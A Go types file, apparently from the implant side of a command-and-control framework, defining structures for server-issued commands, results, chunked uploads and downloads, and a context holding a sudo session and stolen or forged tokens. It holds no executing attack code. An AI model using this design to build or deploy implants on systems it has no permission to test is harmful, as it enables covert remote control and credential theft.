// server/docker/payloads/Linux/types.go

//go:build darwin
// +build darwin

package main

import (
	"sync"
	"time"
)

// Command represents a single command from the C2 server
type Command struct {
	CommandType      int    `json:"ct"`       // Numeric command ID for dispatch
	Command          string `json:"co"`            // Full command string with args
	CommandID        string `json:"ci"`
	CommandDBID      int    `json:"cb"`
	AgentID          string `json:"ai"`
	Filename         string `json:"fn"`
	OriginalFilename string `json:"of"`
	RemotePath       string `json:"rp"`
	CurrentChunk     int    `json:"cc"`
	TotalChunks      int    `json:"tc"`
	Data             string `json:"data"`
	Arguments        string `json:"ar"`
	Timestamp        string `json:"ts"`
	JobID            string `json:"ji"`
}

// CommandResult represents the result of command execution
type CommandResult struct {
	Command     Command
	Output      string
	Error       error
	ErrorString string
	ExitCode    int
	CompletedAt string
	JobID       string // Add this field for async BOF tracking
}

// CommandResponse represents the response to send back to server
type CommandResponse struct {
	Command      string `json:"co"`
	CommandID    string `json:"ci"`
	CommandDBID  int    `json:"cb"`
	AgentID      string `json:"ai"`
	Filename     string `json:"fn"`
	RemotePath   string `json:"rp"`
	CurrentChunk int    `json:"cc"`
	TotalChunks  int    `json:"tc"`
	Data         string `json:"data"`
	Output       string `json:"ou"`
	Error        string `json:"error,omitempty"`
	ExitCode     int    `json:"ec"`
	Timestamp    string `json:"ts"`
	JobID        string `json:"ji"` // Add this field
}

// CommandContext holds shared state and functionality for commands
type CommandContext struct {
	mu             sync.RWMutex
	WorkingDir     string
	CurrentCommand *Command          // Add this field for BOF support
	SudoSession    interface{}       // Add this field for storing sudo session
	SessionEnv     map[string]string // Add this field for persistent environment variables
	StolenToken    interface{}       // Keep for backward compatibility
	TokenStore     interface{}       // Unified token store for both steal-token and make-token
	MakeToken      interface{}       // Keep for backward compatibility
}

// CommandHandler is the function signature for command execution.
// All commands are now plain functions instead of struct methods.
type CommandHandler func(ctx *CommandContext, args []string) CommandResult

// CommandInterface is deprecated - kept for backward compatibility during migration.
// New commands should use CommandHandler functions instead.
type CommandInterface interface {
	Execute(ctx *CommandContext, args []string) CommandResult
}

// JobInfo represents information about an active job
type JobInfo struct {
	ID        string // Unique job identifier
	StartTime time.Time
	Filename  string
	Active    bool
	Type      string // "download", "upload", etc
}

// UploadInfo tracks active upload operations
type UploadInfo struct {
	Chunks      map[int][]byte
	TotalChunks int
	RemotePath  string
	Filename    string
	LastUpdate  time.Time // Track last chunk received time
	StartTime   time.Time // Track when upload started
}

// DownloadInfo tracks active download operations
type DownloadInfo struct {
	FilePath    string
	TotalChunks int
	NextChunk   int
	LastUpdate  time.Time
	InProgress  bool
}
